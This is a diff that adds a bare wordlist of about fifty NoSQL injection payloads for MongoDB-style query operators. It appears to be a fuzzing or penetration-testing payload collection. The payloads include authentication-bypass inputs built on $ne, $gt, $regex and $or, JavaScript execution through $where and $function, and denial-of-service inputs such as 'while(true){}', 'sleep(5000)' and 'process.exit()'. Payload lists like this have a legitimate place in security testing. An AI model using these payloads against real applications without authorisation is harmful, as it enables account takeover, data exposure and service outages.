@@ -1,0 +1,103 @@
+NoSQL Injection
+.
+{"$ne": null}
+.
+{"$gt": ""}
+.
+{"$regex": ".*"}
+.
+{"$where": "1==1"}
+.
+{"$or": [{"username": "admin"}, {"password": "123"}]}
+.
+{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
+.
+{"$and": [{"username": "admin"}, {"password": {"$regex": "^.*"}}]}
+.
+{"$nor": [{"username": "not"}, {"password": "not"}]}
+.
+{"$not": {"username": {"$ne": "admin"}}}
+.
+{"$size": 0}
+.
+{"$type": 2}
+.
+{"$elemMatch": {"username": {"$eq": "admin"}}}
+.
+{"$comment": "injection"}
+.
+{"$jsonSchema": {"type": "object", "properties": {"username": {"pattern": "."}}}}
+.
+{"$expr": {"$eq": ["$username", "admin"]}}
+.
+{"$function": {"body": "function() { return true; }", "args": []}}
+.
+{"username": {"$in": ["admin", "root"]}}
+.
+{"username": {"$nin": ["guest"]}}
+.
+{"password": {"$exists": true}}
+.
+{"password": {"$mod": [2, 0]}}
+.
+{"$where": "this.username == 'admin'"}
+.
+{"$where": "1===1"}
+.
+{"$where": "typeof this.password == 'string'"}
+.
+{"$where": "function(){ return this._id == ObjectId('...') }"}
+.
+{"$where": "return true"}
+.
+{"$where": "sleep(5000)"}
+.
+{"$where": "while(true){}"}
+.
+{"$where": "process.exit()"}
+.
+{"$where": "eval('1==1')"}
+.
+{"$where": "new Function('return 1==1')()"}
+.
+{"username": {"$regex": "adm[i-n]"}}
+.
+{"username": {"$regex": "^admin$", "$options": "i"}}
+.
+{"password": {"$regex": ".*"}}
+.
+{"$or": [{"username": {"$regex": ".*"}}, {"password": {"$regex": "."}}]}
+.
+{"$and": [{"username": {"$ne": "x"}}, {"password": {"$ne": "x"}}]}
+.
+{"$nor": [{"username": {"$eq": "x"}}, {"password": {"$eq": "x"}}]}
+.
+{"username": {"$ne": null, "$type": 2}}
+.
+{"password": {"$gt": "", "$lt": "zzz"}}
+.
+{"$where": "this.username.match(/admin/)"}
+.
+{"$where": "this.password.length > 0"}
+.
+{"$where": "new Date() - this.created < 100000"}
+.
+{"$where": "function(){ return this.role == 'admin'; }"}
+.
+{"$where": "function(){ for(var i in this){ if(i=='password') return true; } return false; }"}
+.
+{"$where": "function(){ return JSON.stringify(this).includes('admin'); }"}
+.
+{"$where": "function(){ return this.username.substring(0,1) == 'a'; }"}
+.
+{"$where": "function(){ return this._id.toString().startsWith('...'); }"}
+.
+{"username": {"$regex": ".*admin.*"}}
+.
+{"password": {"$regex": "^[a-z0-9]+$"}}
+.
+{"$or": [{"username": "admin"}, {"username": {"$regex": ".*"}}]}
+.
+{"$and": [{"username": "admin"}, {"password": {"$ne": "x"}}]}
+.
+{"$where": "function(){ return this.username === 'admin' || this.username === 'root'; }"}
